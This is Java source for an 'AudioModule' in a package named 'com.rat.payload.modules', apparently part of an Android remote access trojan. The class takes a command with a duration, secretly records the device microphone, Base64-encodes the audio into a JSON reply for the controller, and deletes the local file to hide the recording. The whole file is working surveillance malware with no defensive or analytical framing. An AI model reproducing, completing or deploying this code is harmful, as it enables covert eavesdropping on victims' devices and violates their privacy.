package com.rat.payload.modules;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;

public class AudioModule implements CommandHandler.Command {

    private static final String TAG = "AudioModule";
    private Context context;
    private MediaRecorder recorder;

    public AudioModule(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        try {
            int duration = args.optInt("duration", 5000);
            File outputDir = context.getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            File outputFile = new File(outputDir, "recording_" + System.currentTimeMillis() + ".m4a");

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(outputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(duration);
            recorder.stop();
            recorder.release();

            FileInputStream fis = new FileInputStream(outputFile);
            byte[] bytes = new byte[(int) outputFile.length()];
            fis.read(bytes);
            fis.close();

            String b64 = Base64.encodeToString(bytes, Base64.DEFAULT);
            result.put("audio", b64);
            result.put("duration", duration);
            result.put("format", "m4a");
            outputFile.delete();
        } catch (Exception e) {
            Log.e(TAG, "record error: " + e.getMessage());
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
